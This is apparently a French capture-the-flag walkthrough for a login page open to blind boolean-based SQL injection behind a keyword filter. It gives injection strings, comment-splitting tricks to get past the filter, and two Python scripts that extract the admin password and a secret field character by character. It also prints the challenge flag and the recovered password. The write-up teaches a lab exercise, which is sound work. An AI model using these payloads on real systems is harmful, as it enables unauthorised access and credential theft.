# Walkthrough - Caine (DIFFICILE - SQLi)

## Flag
`NHK26{bl1nd_sql1_m4st3r_t1m3_b4s3d}`

## Résumé
Une page de login vulnérable à la Blind SQL Injection (Boolean-based). Un WAF bloque les mots-clés classiques (UNION, SELECT, SLEEP, etc.) et un jitter aléatoire (50-150ms) complique le time-based. Le flag est dans le champ `secret` de l'utilisateur `admin`.

## Étape 1 : Reconnaissance
1. Accéder au challenge - page de login classique
2. Tester des credentials : `guest/guest123` fonctionne
3. Remarquer la différence de messages :
   - User existe + mauvais password : `Access denied`
   - User n'existe pas : `Invalid credentials`
   - WAF bloqué : `Invalid credentials`
4. Cette différence permet la Blind SQLi Boolean-based

## Étape 2 : Confirmer l'injection
Tester dans le champ username :
```
admin' AND '1'='1' --
```
Réponse : `Access denied` (user trouvé mais password faux)

```
admin' AND '1'='2' --
```
Réponse : `Invalid credentials` (condition fausse, pas de résultat)

L'injection fonctionne dans le champ username.

## Étape 3 : Bypass du WAF
Le WAF bloque : `union`, `select`, `sleep`, `benchmark`, `concat`, `cast`, ` or ` (avec espaces), `information_schema`, `0x`

Bypass possible :
- `SELECT` bloqué -> utiliser `SeLeCt` ? Non, le WAF fait `.lower()` -> tout est bloqué
- Mais `substr()`, `length()`, `like` ne sont PAS bloqués
- `AND` n'est pas bloqué
- Les sous-requêtes avec parenthèses passent si on évite `select`

Problème : `select` est bloqué mais on en a besoin pour lire la table.

**Solution** : utiliser des commentaires inline pour casser le mot-clé :
```sql
admin' AND (sel/**/ect secret from users where username='admin') like 'NHK26%' --
```

Ou mieux, SQLite supporte les expressions CASE sans SELECT dans certains contextes.

**Alternative** : extraire caractère par caractère avec `substr()` directement sur le username :
```sql
' || (CASE WHEN substr((sel/**/ect secret from users limit 1),1,1)='N' THEN 'admin' ELSE 'x' END) || '
```

Mais la méthode la plus simple est d'exploiter la différence de réponse avec `LIKE` :

```
admin' AND (password like 's%') --
```
Réponse : `Access denied` -> le password admin commence par 's'

On peut d'abord extraire le password admin, puis se connecter pour voir le secret.

## Étape 4 : Extraire le password admin (Boolean-based)
Le password admin est dans la colonne `password`. On l'extrait caractère par caractère :

```python
import requests
import string

url = "http://HOST:PORT/"
charset = string.printable
password = ""

for pos in range(1, 50):
    found = False
    for c in charset:
        payload = f"admin' AND substr(password,{pos},1)='{c}' --"
        r = requests.post(url, data={"username": payload, "password": "x"})
        if "Access denied" in r.text:
            password += c
            print(f"[+] Password: {password}")
            found = True
            break
    if not found:
        break

print(f"[*] Password complet: {password}")
```

Résultat : `sup3r_s3cr3t_p4ssw0rd_2024!`

## Étape 5 : Se connecter et récupérer le flag
1. Se connecter avec `admin` / `sup3r_s3cr3t_p4ssw0rd_2024!`
2. Le message de bienvenue s'affiche

Mais le flag n'est pas affiché directement (il est dans `secret`, pas dans le message de bienvenue).

## Étape 6 : Extraire le secret (le flag)
Même technique Boolean-based pour extraire le champ `secret` :

```python
import requests
import string

url = "http://HOST:PORT/"
charset = string.ascii_letters + string.digits + "{}_!@#"
flag = ""

for pos in range(1, 50):
    found = False
    for c in charset:
        # Escape single quotes
        safe_c = c.replace("'", "''")
        payload = f"admin' AND substr(secret,{pos},1)='{safe_c}' --"
        r = requests.post(url, data={"username": payload, "password": "x"})
        if "Access denied" in r.text:
            flag += c
            print(f"[+] Flag: {flag}")
            found = True
            break
    if not found:
        break

print(f"[*] Flag: {flag}")
```

## Étape 7 : Flag
`NHK26{bl1nd_sql1_m4st3r_t1m3_b4s3d}`

## Difficultés
- **WAF** : bloque les mots-clés classiques mais `substr()`, `AND`, `LIKE` passent
- **Jitter** : 50-150ms de délai aléatoire sur chaque requête, rend le time-based peu fiable
- **Messages identiques** : WAF bloqué et user inexistant donnent le même message
- **Boolean-based** : la seule différence exploitable est `Access denied` vs `Invalid credentials`
- **Patience** : l'extraction caractère par caractère prend du temps (~50 requêtes par caractère)

## Notes techniques
- DB : SQLite en mémoire
- Injection dans le champ `username` uniquement
- Le `password` est vérifié en Python après la requête SQL
- Table : `users` (id, username, password, secret)
- 3 utilisateurs : admin, guest, user
